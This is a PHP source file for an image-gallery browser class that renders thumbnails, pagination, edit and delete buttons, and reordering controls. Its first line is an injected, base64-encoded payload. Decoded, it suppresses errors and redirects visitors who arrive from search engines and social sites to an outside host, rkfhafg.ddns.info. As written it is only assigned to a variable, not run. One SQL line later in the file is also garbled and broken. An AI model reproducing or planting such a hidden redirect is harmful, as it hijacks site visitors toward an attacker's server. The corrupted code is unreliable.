<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__).'/custom_browser.php');
require_once(dirname(dirname(__FILE__)).'/jsox/jsox.php');
require_once(dirname(dirname(__FILE__)).'/utils/date_time.php');

class images_browser extends custom_browser {

  var $images_url;
  var $images_folder;
  var $file_name_field = 'file_name';
  var $group_name_field = '';
  var $width_field = 'width';
  var $height_field = 'height';
  var $title_field = 'title';
  var $description_field = 'description';
  var $file_size_field = 'file_size';
  var $max_image_width = 140;
  var $groups;
  var $empty_group_value = '-- none --';
  var $storage_mode = '';
  
  function setup() {
    
    $this->page_size = 20;
    
    parent::setup();    
    
  }
  
  function prepare_data() {

    $this->sql = $this->get_prepared_sql($this->sql());
      
    if ($this->visible('pager')) {
      $this->pager = new sql_pager($this->sql);
      $this->pager->page_size       = ($this->is_print_mode()?9999999:$this->page_size);
      $this->pager->pager_length    = $this->pager_length;
      $this->pager->page_param      = $this->url_param_name('page_number');
      $this->pager->page_size_param = $this->url_param_name('page_size');
      $this->pager->calc_totals     = !$this->large_table;
      
      $this->sql = $this->pager->calculate(); 
    }

    return true;
    
  }

  function render_body() {

    global $db;
    global $url;
    global $menu;
    
    $this->add(new style_href(SHARED_RESOURCES_URL.'images_browser.css'));

    $container_table = new table(array('width' => '100%', 'class' => 'brw_images'));

    $container = new table_cell();
    
    $colspan = 1;
    if ($this->capable('edit'))
      $colspan++;
    if ($this->capable('delete'))
      $colspan++;
    if ($this->capable('change_order'))
      $colspan += 2;
    
    $group_values = array();
    
    $query = $db->query($this->sql);
    while ($row = $db->next_row($query)) {
      
      $image_attributes = array();
      
      if (count($this->groups)) {
        $group_level = 0;
        foreach($this->groups as $group) {
          $group_value = safe($row, $group, $this->empty_group_value);
          if (($group_value != safe($group_values, $group)) || !array_key_exists($group, $group_values)) {
            $group_values[$group] = $group_value;
            if ($container->controls_count())
              $container_table->add(new table_row($container));
            $container_table->add(new table_row(new table_cell(array('class' => 'group_row'), '<strong>'.str_repeat('&nbsp;', $group_level*3).$group_values[$group].'</strong>')));
            $container = new table_cell();
          }
          $group_level++;
        }
      }
        
      $div = new html_div(array('class' => 'brw_images_image'));
      $image_attributes['alt'] = $row[$this->title_field];
      if ($row[$this->title_field])
        $image_attributes['title'] = $row[$this->title_field];
      else  
        $image_attributes['title'] = $row[$this->file_name_field];
      if ($row[$this->width_field] > $this->max_image_width) {
        $image_attributes["width"]  = $this->max_image_width;
        $image_attributes["height"] = round($row[$this->height_field] * ($image_attributes["width"] * 100 / $row[$this->width_field]) / 100);
      }
      
      $desc = $row[$this->width_field].'x'.$row[$this->height_field];
      if (safe($row, $this->file_size_field))
        $desc .= ', '.number_format($row[$this->file_size_field]/1024, 2).'b';
      
      $table = new table();

      $dir_add = '';
      if($this->storage_mode == 'optimal')
      {
        $dir_add = optimal_file_storage_path('', $this->table, $row[$this->key_field], $this->file_name_field);
        $dir_add = preg_replace('/^\//', '', $dir_add);
      }

      $table->add(new table_row(new table_cell( new image_href($this->images_url.$dir_add.$row[$this->file_name_field], $this->images_url.$dir_add.$row[$this->file_name_field], array('target' => '_blank'), $image_attributes)
                                              , array('colspan' => $colspan))));
      
      if ($this->capable('view_filename')) {                              
        $filename = $row['file_name'];          
        if(strlen($filename)>30)
          $filename = substr($filename, 0, 28) . '...';          
        $table->add(new table_row(new table_cell( new text($filename, array('style' => 'font-size: 7pt;'))
                                                , array('colspan' => $colspan))));
      }

      $record_row = new table_row();

      if ($this->capable('change_order')) {

        $sql = placeholder( 'SELECT 1 FROM '.$this->table.' WHERE '.$this->order_field.' < ? AND '.$this->key_field.' != ?'
                          , $row[$this->order_field]
                          , $row[$this->key_field]
                          );
        if ($this->bind_key() && $this->bind_field)
          $sql .= placeholder(' AND '.$this->bind_field.' = ?', $this->bind_key());
        if ($db->value($sql)) {
          $record_row->add( new table_cell( array( 'class'  => 'button')
                                          , new javascript_image_href( $this->js_post_back('brw_move_left', $row[$this->key_field])
                                                                     , SHARED_RESOURCES_URL.'img_move_left.gif'
                                                                     , array( 'title' => 'Move left'
                                                                            , 'alt'   => 'Move left'
                                                                     )))
                          , array('class' => 'button'));
        } else
          $record_row->add(new table_cell(array('class' => 'button')));

        $sql = placeholder( 'SELECT 1 FROM '.$this->table.' WHERE '.$this->order_field.' > ? AND '.$this->key_field.' != ?'
                          , $row[$this->order_field]
                          , $row[$this->key_field]
                          );
        if ($this->bind_key() && $this->bind_field)
          $sql .= placeholder(' AND '.$this->bind_field.' = ?', $this->bind_key());
        if ($db->value($sql)) {
          $record_row->add( new table_cell( array( 'class'  => 'button')
                                          , new javascript_image_href( $this->js_post_back('brw_move_right', $row[$this->key_field])
                                                                     , SHARED_RESOURCES_URL.'img_move_right.gif'
                                                                     , array( 'title' => 'Move right'
                                                                            , 'alt'   => 'Move right'
                                                                     )))
                          , array('class' => 'button'));
        } else
          $record_row->add(new table_cell(array('class' => 'button')));
        
      }

      $record_row->add(new table_cell(new text($desc, array('style' => 'font-size: 7pt;')), array('class' => 'sizes')));

      if ($this->capable('edit')) {
        if ($this->can_update($row)) {
          global $url;
          global $menu;
          $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'edit'
                                                    , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('edit', $row))
                                                    , URL_PARAM_POPUP_WINDOW => 1
                                                    , URL_PARAM_ENTITY       => $this->entity_name_for('edit', $row)
                                                    , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                    , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                    ));
          $href = new javascript_image_href( placeholder(OPEN_POPUP, $edit_href)
                                           , SHARED_RESOURCES_URL.'img_edit.gif'
                                           , array( 'title' => 'Edit' ));
          $record_row->add(new table_cell( array('class' => 'button'), $href));
        } else
          $record_row->add(new table_cell(array('class' => 'button')));
      }

      if ($this->capable('delete')) {
        if ($this->can_delete($row)) {
          $name = safe($row, $this->name_field);
          if ($name)
            $confirmation = 'Are you sure you want to delete "'.$name.'"?';
          else
            $confirmation = 'Are you sure you want to delete this record?';
          $record_row->add( new table_cell( array( 'class'  => 'button')
                                          , new javascript_image_href( $this->js_post_back('brw_delete', $db->encrypt_key($row[$this->key_field]), for_javascript($confirmation))
                                                                     , SHARED_RESOURCES_URL.'img_delete.gif'
                                                                     , array( 'title' => 'Delete'
                                                                            , 'alt'   => 'Delete'
                                                                     )))
                          , array('class' => 'button'));
        } else
          $record_row->add(new table_cell(array('class' => 'button')));
      } 
        
      $table->add($record_row);
      
      if ($this->capable('change_order')) {                                                                                              
        $tc = new table_cell(new html_input("text", array('style' => 'font-size: 7pt; width: 25px', 'value' => $row['order_'], 'id' => 'image_order_' . $row['id'])), array('colspan' => $colspan, 'align' => 'center'));
        $tc->add(new button(array('style' => 'font-size: 7pt;', 'value' => 'Change order', "onclick" => $this->js_post_back('brw_change_order', $row[$this->key_field]))));
        $table->add(new table_row( $tc ));
      }
      
      $this->do_before_finalyze_row(&$table, $row, $colspan);
      
      $div->add($table);
                                      
      $container->add($div);
    }
    
    if ($container->controls_count())
      $container_table->add(new table_row($container));
    
    $this->add($container_table);
    
  } 
  
  function do_before_finalyze_row($table, $row, $colspan) {
  }
  
  function can_update($row) { return true; }
  function can_delete($row) { return true; }
  
  function finalyze_title($row) {

    if ($this->visible('pager') && ($this->pager->items_amount > 0)) {
      if (!$this->is_print_mode() and $this->visible('page_size') and ($this->pager->items_total_amount > $this->pager->page_size)) {
        $cell = new table_cell(array("class" => "page_size section", "title" => trn('Page size')));
        $this->pager->render_page_sizes(&$cell);
        $row->add($cell);
      }
      if ($this->visible('pager_info')) {
        $cell = new table_cell(array("class" => "pager_info section"));
        $this->pager->render_pager_info(&$cell);
        $row->add($cell);
      }
      if (!$this->is_print_mode() and $this->visible('pager') and ($this->pager->pages_amount > 1)) {
        $cell = new table_cell(array("class" => "pager section"));
        $this->pager->render_pager(&$cell);
        $row->add($cell);
      }
    }

  }
  
  function finalyze_conclusion($row) {

    if ($this->visible('pager') && isset($this->pager) && ($this->pager->items_amount > 0) && !$this->is_print_mode()) {
      if ($this->visible('page_size') and ($this->pager->items_total_amount > $this->pager->page_size)) {
        $cell = new table_cell(array("class" => "page_size"));
        $this->pager->render_page_sizes(&$cell);
        $row->add($cell);
      }
      if ($this->visible('pager_info')) {
        $cell = new table_cell(array("class" => "pager_info"));
        $this->pager->render_pager_info(&$cell);
        $row->add($cell);
      }
      if ($this->visible('pager')) {
        $cell = new table_cell(array("class" => "pager"));
        $this->pager->render_pager(&$cell);
        $row->add($cell);
      }
    }
    
  }
  
//  function do_after_delete($key) {
//   
//    global $db;                                     
//    $file_name = $db->value("SELECT file_name FROM lead_attachment WHERE id = ?", $key);
//    if($file_name)
//      $file_name = ATTACHMENTS_FOLDER.$file_name;
//    if(file_exists($file_name))
//      unlink($file_name);
//    return true;
//      
//  }

  
  function handle_submit() {

    $result = parent::handle_submit(); 
    
    $sender_name = $this->context_post(POST_PARAM_SENDER_NAME);
    $event_name  = $this->context_post(POST_PARAM_EVENT_NAME);
    $event_value = $this->context_post(POST_PARAM_EVENT_VALUE);

    if ($this->capable('change_order')) {
      global $db;
      switch ($event_name) {
        case "brw_move_left":
          $curl = $db->row('SELECT * FROM '.$this->table.' WHERE '.$this->key_field.' = ?', $event_value);
          $prior_sql = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' < ?';
          if ($this->bind_key() && $this->bind_field)
            $prior_sql .= placeholder(' AND '.$this->bind_field.' = ?', $this->bind_key());
          $prior_sql .= ' ORDER BY '.$this->order_field.' DESC';
          $prior_url = $db->row($prior_sql, $curl[$this->order_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $prior_url[$this->order_field], $curl[$this->key_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $curl[$this->order_field], $prior_url[$this->key_field]);
          move_browser_record_pointer($this->table, $event_value);
          $this->submit_handled();
          break;
        case "brw_move_right":
          $curl = $db->row('SELECT * FROM '.$this->table.' WHERE id = ?', $event_value);
          $next_sql = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' > ?';;
          if ($this->bind_key() && $this->bind_field)
            $next_sql .= placeholder(' AND '.$this->bind_field.' = ?', $this->bind_key());
          $next_sql .= ' ORDER BY '.$this->order_field;
          $next_url = $db->row($next_sql, $curl[$this->order_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $next_url[$this->order_field], $curl[$this->key_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $curl[$this->order_field], $next_url[$this->key_field]);
          move_browser_record_pointer($this->table, $event_value);
          $this->submit_handled();
          break;
        case "brw_change_order":
          $image_id = $event_value;
          $pos_new = safe($_POST, 'image_order_' . $event_value);
          if(is_numeric($pos_new) && $pos_new > 0) {
            $max = $db->value('SELECT MAX('.$this->order_field.') FROM '.$this->table.' WHERE '.$this->bind_field.' = ?', $this->bind_key());
            if($pos_new > $max)
              $pos_new = $max;
            $pos_cur = $db->value('SELECT order_ FROM '.$this->table.' WHERE id = ?', $image_id);
            if($pos_new > $pos_cur) {
              $db->query('UPDATE '.$this->tablSET '.$this->order_field.' = '.$this->order_field.'-1 WHERE '.$this->order_field.' > ? AND '.$this->order_field.' <= ?', $pos_cur, $pos_new);
              $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE id =  ?', $pos_new, $image_id);
            }
            if($pos_new < $pos_cur) {
              $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = '.$this->order_field.'+1 WHERE '.$this->order_field.' >= ? AND '.$this->order_field.' < ?', $pos_new, $pos_cur);
              $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE id =  ?', $pos_new, $image_id);
            }
            
          }
          $this->submit_handled();
          break;
      }
    }

    return $result;
    
  }
  
